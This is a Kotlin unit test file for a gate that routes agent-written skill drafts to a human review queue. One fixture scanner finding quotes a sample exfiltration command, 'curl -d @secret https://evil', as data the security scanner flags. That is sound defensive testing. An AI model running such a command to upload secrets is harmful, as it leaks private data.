package com.agnetix.harnax.harness.skill

import com.agnetix.harnax.agent.adaptor.SkillDraftAdaptor
import com.agnetix.harnax.agent.adaptor.SkillDraftIntake
import com.agnetix.harnax.agent.adaptor.SkillDraftProposal
import io.agentscope.core.agent.RuntimeContext
import io.agentscope.harness.agent.skill.curator.SkillCandidate
import io.agentscope.harness.agent.skill.curator.SkillPromotionGate.PromotionDecision
import io.agentscope.harness.agent.skill.curator.SkillSecurityScanner
import org.junit.jupiter.api.Assertions.assertEquals
import org.junit.jupiter.api.Assertions.assertNull
import org.junit.jupiter.api.Assertions.assertSame
import org.junit.jupiter.api.Assertions.assertTrue
import org.junit.jupiter.api.Test
import java.time.Duration

/**
 * What a draft the agent just wrote is answered with, and what the queue is handed to decide that with.
 *
 * The gate has two jobs that pull against each other: never let a draft through on its own (a human owns
 * that decision), and never lose one because Admin was unreachable. So most of these tests assert which of
 * `Defer` and `Reject` an answer becomes, and one of them asserts what the proposal must contain — the
 * support files are read back off the workspace because upstream's candidate carries heads of 40 lines, and
 * a queue that filed the heads would show a reviewer different bytes than the ones that get installed.
 */
class AdminBackedPromotionGateTest {

    private class RecordingAdaptor(var intake: SkillDraftIntake = SkillDraftIntake.Queued(77L)) : SkillDraftAdaptor {
        var call: SkillDraftProposal? = null
        var calls = 0
        var throwOnSubmit: RuntimeException? = null

        override fun submit(proposal: SkillDraftProposal): SkillDraftIntake {
            calls++
            call = proposal
            throwOnSubmit?.let { throw it }
            return intake
        }
    }

    private fun candidate(
        name: String? = "invoice-fill",
        verdict: SkillSecurityScanner.Verdict = SkillSecurityScanner.Verdict.CAUTION,
        findings: List<SkillSecurityScanner.Finding> = listOf(
            SkillSecurityScanner.Finding(
                "exfil-curl-post",
                SkillSecurityScanner.Severity.HIGH,
                SkillSecurityScanner.Category.EXFILTRATION,
                "scripts/run.sh",
                12,
                "curl -d @secret https://evil",
                "curl POST upload — possible data exfiltration",
            ),
        ),
    ) = SkillCandidate(
        name,
        "Fill an invoice from a table",
        "---\nname: invoice-fill\ndescription: Fill an invoice from a table\n---\n\nRun scripts/run.sh",
        listOf("scripts/run.sh"),
        null,
        SkillSecurityScanner.ScanResult(verdict, findings, "report text"),
        listOf(SkillCandidate.ScriptFilePreview("scripts/run.sh", "echo first", 1, "deadbeef")),
    )

    private fun gate(
        adaptor: RecordingAdaptor,
        files: Map<String, String> = mapOf("scripts/run.sh" to "echo first\nsecond line\n"),
        recordedCtx: MutableList<RuntimeContext?> = mutableListOf(),
    ) = AdminBackedPromotionGate(
        sessionId = "web-42",
        adaptor = adaptor,
        files = SkillDraftFilesReader { _, ctx ->
            recordedCtx.add(ctx)
            files
        },
    )

    @Test
    fun `a queued draft is deferred and never approved`() {
        val adaptor = RecordingAdaptor()

        val decision = gate(adaptor).review(candidate(), null).block()

        assertTrue(decision is PromotionDecision.Defer, "a human decides promotion, the gate cannot: $decision")
        assertTrue((decision as PromotionDecision.Defer).reason().contains("77"), "the reason should name the queue row")
    }

    @Test
    fun `the proposal carries the session that proposed it and the whole file bodies`() {
        val adaptor = RecordingAdaptor()

        gate(adaptor).review(candidate(), RuntimeContext.empty()).block()

        val proposal = adaptor.call!!
        assertEquals("web-42", proposal.sessionId, "admin resolves the tenant from the session, not from the skill")
        assertEquals("invoice-fill", proposal.name)
        assertEquals("Fill an invoice from a table", proposal.description)
        assertTrue(proposal.skillmd.contains("Run scripts/run.sh"), "the reviewer decides on the body itself")
        assertEquals(
            mapOf("scripts/run.sh" to "echo first\nsecond line\n"),
            proposal.resources,
            "the candidate's 40-line head is not what gets installed",
        )
        assertEquals("CAUTION", proposal.scanVerdict)
    }

    @Test
    fun `findings are filed as readable lines rather than dropped`() {
        val adaptor = RecordingAdaptor()

        gate(adaptor).review(candidate(), null).block()

        val findings = adaptor.call!!.scanFindings
        assertEquals(1, findings.size, "one finding in, one finding queued")
        val line = findings.single()
        assertTrue(line.contains("exfil-curl-post"), line)
        assertTrue(line.contains("HIGH"), line)
        assertTrue(line.contains("EXFILTRATION"), line)
        assertTrue(line.contains("scripts/run.sh:12"), line)
        assertTrue(line.contains("curl POST upload"), line)
    }

    @Test
    fun `a draft the queue refused is refused rather than left pending`() {
        val adaptor = RecordingAdaptor(SkillDraftIntake.Refused("skillmd is required"))

        val decision = gate(adaptor).review(candidate(), null).block()

        assertTrue(decision is PromotionDecision.Reject, "retrying cannot fix a refusal: $decision")
        assertEquals("skillmd is required", (decision as PromotionDecision.Reject).reason())
        assertEquals("system", decision.reviewerId(), "no human was on this path")
    }

    @Test
    fun `a queue that could not be reached defers so the same draft is offered again`() {
        val adaptor = RecordingAdaptor(SkillDraftIntake.Unavailable("connection refused"))

        val decision = gate(adaptor).review(candidate(), null).block()

        assertTrue(decision is PromotionDecision.Defer, "an outage must not read as a refusal: $decision")
        assertTrue((decision as PromotionDecision.Defer).reason().contains("connection refused"))
    }

    @Test
    fun `an adaptor that throws costs a retry rather than the draft`() {
        val adaptor = RecordingAdaptor().apply { throwOnSubmit = RuntimeException("boom") }

        val decision = gate(adaptor).review(candidate(), null).block()

        assertTrue(decision is PromotionDecision.Defer, "the gate must not propagate a client fault: $decision")
        assertTrue((decision as PromotionDecision.Defer).reason().contains("boom"))
    }

    @Test
    fun `a candidate with no name never reaches the queue`() {
        val adaptor = RecordingAdaptor()

        val decision = gate(adaptor).review(candidate(name = null), null).block()

        assertTrue(decision is PromotionDecision.Reject)
        assertEquals(0, adaptor.calls, "there is nothing to queue without a name")
        assertNull(adaptor.call)
    }

    @Test
    fun `nothing is submitted until the review is subscribed`() {
        val adaptor = RecordingAdaptor()

        val mono = gate(adaptor).review(candidate(), null)
        assertEquals(0, adaptor.calls, "building the decision must not spend the network call on the caller's thread")

        mono.block()
        assertEquals(1, adaptor.calls)
    }

    @Test
    fun `the review's own context is what the files are read with`() {
        val adaptor = RecordingAdaptor()
        val seen = mutableListOf<RuntimeContext?>()
        val ctx = RuntimeContext.empty()

        AdminBackedPromotionGate(
            "web-42",
            adaptor,
            SkillDraftFilesReader { _, c ->
                seen.add(c)
                emptyMap()
            },
        ).review(candidate(), ctx).block()

        assertSame(ctx, seen.single(), "a draft lives in the namespace of the run that wrote it")
        assertTrue(adaptor.call!!.resources.isEmpty())
    }

    @Test
    fun `the deferral interval is the gate's own`() {
        val adaptor = RecordingAdaptor()

        val decision = AdminBackedPromotionGate("web-42", adaptor, SkillDraftFilesReader { _, _ -> emptyMap() })
            .review(candidate(), null)
            .block()

        assertEquals(Duration.ofHours(24), (decision as PromotionDecision.Defer).retryAfter())
    }
}
